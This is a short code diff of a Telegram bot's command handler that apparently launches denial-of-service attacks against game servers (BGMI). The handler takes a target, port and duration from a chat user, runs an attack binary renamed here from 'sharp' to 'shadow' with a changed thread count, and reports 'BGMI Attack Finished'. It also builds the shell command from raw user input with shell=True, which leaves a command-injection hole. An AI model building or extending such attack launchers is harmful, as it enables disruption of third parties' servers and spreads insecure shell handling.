@@ -310,10 +310,10 @@ def handle_bgmi(message):
             if time > 360:
                 response = "Error: Time interval must be less than 360."
             else:
-                record_command_logs(user_id, '/sharp', target, port, time)
+                record_command_logs(user_id, '/shadow', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./sharp {target} {port} {time} 300"
+                full_command = f"./shadow {target} {port} {time} 100"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
